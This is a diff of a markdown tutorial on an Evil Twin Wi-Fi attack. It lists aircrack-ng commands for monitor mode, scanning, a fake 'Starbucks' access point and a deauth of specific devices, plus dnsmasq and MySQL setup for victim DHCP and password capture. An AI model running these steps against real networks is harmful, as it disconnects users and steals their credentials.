@@ -13,7 +13,7 @@ software : aiicrack-ng dnsmasq
 
 Evil Twin AP Attack: Set up a fake AP impersonating the target AP, and force target AP users to connect to it.
 
-### 1. start wireless card monitor mode 
+### 1. Start wireless card monitor mode 
 
 ```
 airmon-ng start wlan0
@@ -21,7 +21,7 @@ airmon-ng start wlan0
 
 (wlan0 is the port of the wireless network card,it can be check by inputing `ifconfig` or `iwconfig`)
 
-### 2. checking wireless AP(access point)
+### 2. Checking wireless AP(access point)
 
 ```
 airodump-ng wlan0mon
@@ -73,7 +73,7 @@ airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'Starbucks' -c 11 wlan0mon
 
 -c : channel 11 (this is optional)
 
-## 4. deauth target by using aireplay-ng
+## 4. Deauth target by using aireplay-ng
 ```
 aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 ```
@@ -86,7 +86,7 @@ aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 
 
 
-###  Dnsmasq 
+## 5. Setup DNS and DHCP by using dnsmasq 
 
 #### Dnsmasq provides Domain Name System (DNS) forwarder, Dynamic Host Configuration Protocol (DHCP) server, router advertisement and network boot features for small computer networks, created as free software.
 
@@ -104,7 +104,7 @@ allocate the IP address to the client/victim and the client would be able to acc
 
 Now we will define the IP range and the subnet mask for the DHCP server.
 
-6.Configure dnsmasq
+2.Configure dnsmasq conf file 
 
 Create a configuration file for dnsmasq using `vim` or your favorite text editor and add the following code.
 
@@ -127,6 +127,14 @@ listen-address=127.0.0.1
 ```
 Tip: Replace at0 with wlan0 everywhere when hostapd is used for creating an access point
 ```
+
+Parameter Breakdown
+```
+dhcp-range=10.0.0.10,10.0.0.250,12h:  Client IP address will range from 10.0.0.10 to 10.0.0.250 and default lease time is 12 hours.
+dhcp-option=3,10.0.0.1:  3 is code for Default Gateway followed by IP of D.G i.e. 10.0.0.1
+dhcp-option=6,10.0.0.1:  6 for DNS Server followed by IP address
+```
+
 
 
 ## Another method for setup DHCP server and Mysql(for password caputre) in kali (optional)
@@ -187,6 +195,7 @@ after installation ,type
 ```
 /etc/init.d/mysql start
 ```
+
 
 
 ###  Reverse shell
